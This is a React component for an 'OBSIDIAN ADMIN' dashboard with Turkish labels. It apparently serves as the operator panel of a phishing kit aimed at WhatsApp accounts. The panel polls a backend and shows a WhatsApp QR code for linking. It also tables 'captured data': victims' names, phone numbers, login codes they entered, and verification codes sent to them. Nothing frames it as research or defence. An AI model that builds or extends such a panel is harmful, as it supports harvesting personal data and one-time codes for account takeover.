import React, { useState, useEffect } from 'react';
import axios from 'axios';
import API_URL from '../api/config';

const AdminPanel = () => {
  const [data, setData] = useState({ status: 'INITIALIZING', qr: null, logs: [] });
  const [loading, setLoading] = useState(true);

  const fetchStatus = async () => {
    try {
      const response = await axios.get(`${API_URL}/api/admin/status`);
      setData(response.data);
    } catch (error) {
      console.error('Admin Fetch Error:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchStatus();
    const interval = setInterval(fetchStatus, 3000); // 3 saniyede bir güncelle
    return () => clearInterval(interval);
  }, []);

  const getStatusColor = (status) => {
    switch (status) {
      case 'READY': return '#22C55E';
      case 'QR_REQUIRED': return '#EAB308';
      case 'AUTHENTICATING': return '#3B82F6';
      case 'DISCONNECTED': return '#EF4444';
      default: return '#737373';
    }
  };

  return (
    <div className="reg-card" style={{ maxWidth: '800px', width: '90%', margin: '20px auto', gap: '24px' }}>
      <div className="card-title-section">
        <div className="title" style={{ fontSize: '24px' }}>OBSIDIAN ADMIN</div>
        <div className="subtitle">Sistem Durumu ve Ele Geçirilen Veriler</div>
      </div>

      {/* Connection Status Card */}
      <div style={{ background: '#0E0E0E', padding: '20px', borderRadius: '12px', border: '1px solid var(--border-color)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <div className="badge-title">BAĞLANTI DURUMU</div>
          <div style={{ color: getStatusColor(data.status), fontWeight: '700', marginTop: '4px', fontSize: '18px' }}>
            {data.status}
          </div>
        </div>
        <div className="status-dot" style={{ width: '12px', height: '12px', backgroundColor: getStatusColor(data.status), boxShadow: `0 0 10px ${getStatusColor(data.status)}` }}></div>
      </div>

      {/* QR Code Section */}
      {data.status === 'QR_REQUIRED' && data.qr && (
        <div style={{ textAlign: 'center', background: '#FFF', padding: '20px', borderRadius: '12px', width: 'fit-content', margin: '0 auto' }}>
          <div style={{ color: '#000', fontSize: '12px', fontWeight: '700', marginBottom: '10px' }}>WA QR KODU OKUTUN</div>
          <img src={data.qr} alt="WhatsApp QR" style={{ width: '256px', height: '256px' }} />
        </div>
      )}

      {/* Logs Table */}
      <div style={{ marginTop: '20px' }}>
        <div className="badge-title" style={{ marginBottom: '12px' }}>ELE GEÇIRILEN VERILER (SON 50)</div>
        <div style={{ overflowX: 'auto', background: '#0E0E0E', borderRadius: '12px', border: '1px solid var(--border-color)' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse', color: 'var(--text-main)', fontSize: '12px' }}>
            <thead>
              <tr style={{ textAlign: 'left', borderBottom: '1px solid var(--border-color)' }}>
                <th style={{ padding: '12px' }}>Zaman</th>
                <th style={{ padding: '12px' }}>Tip</th>
                <th style={{ padding: '12px' }}>Detay</th>
              </tr>
            </thead>
            <tbody>
              {data.logs.length === 0 ? (
                <tr>
                  <td colSpan="3" style={{ padding: '20px', textAlign: 'center', color: 'var(--text-muted)' }}>Henüz veri yakalanmadı.</td>
                </tr>
              ) : (
                data.logs.map((log, idx) => (
                  <tr key={idx} style={{ borderBottom: '1px solid rgba(255,255,255,0.02)' }}>
                    <td style={{ padding: '12px', whiteSpace: 'nowrap' }}>{new Date(log.timestamp).toLocaleTimeString()}</td>
                    <td style={{ padding: '12px' }}>
                      <span style={{ fontSize: '10px', padding: '2px 6px', borderRadius: '4px', background: log.type === 'REGISTRATION' ? '#1E3A8A' : log.type === 'LOGIN_ATTEMPT' ? '#14532D' : '#3F2212' }}>
                        {log.type}
                      </span>
                    </td>
                    <td style={{ padding: '12px' }}>
                      {log.type === 'REGISTRATION' ? `${log.fullName} | ${log.phone}` :
                        log.type === 'LOGIN_ATTEMPT' ? `${log.phone} | Kod: ${log.enteredCode} [${log.success ? '✓' : '✗'}]` :
                          log.type === 'CODE_REQUEST' ? `${log.phone} -> ${log.sentCode}` : ''}
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
